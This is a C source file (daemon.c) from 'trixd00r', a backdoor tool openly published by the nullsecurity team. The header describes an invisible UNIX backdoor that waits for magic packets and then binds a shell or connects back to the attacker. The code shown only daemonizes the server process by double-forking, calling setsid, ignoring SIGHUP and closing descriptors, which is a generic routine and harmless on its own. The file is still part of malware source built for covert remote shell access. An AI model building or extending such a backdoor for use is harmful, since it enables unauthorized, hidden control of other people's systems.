/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/daemon.c                                                         *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "daemon.h"
#include "signals.h"
#include "trixd00rd.h"
#include "wrapper.h"
#include "error.h"


/* puts server in background -> daemonize */
void daemonize() 
{
   unsigned char i = 0;
   pid_t pid = 0;


   if ((pid = fork()) < 0) {
       print_error(ERR_GEN);
   } else if (pid) {
       __EXIT_SUCCESS;
   }
   
   /* child 1 continues become session leader */
   if (setsid() < 0) {
       __EXIT_FAILURE;
   }
   xsignal(SIGHUP, SIG_IGN);
   if ((pid = fork()) < 0) {
       print_error(ERR_GEN);
   } else if (pid) {
       __EXIT_SUCCESS;
   }
   /* child 2 continues and close file descriptors */
   for (i = 0; i < MAXFD; i++) {
       xclose(i);
   }
   
   return;
}

/* EOF */
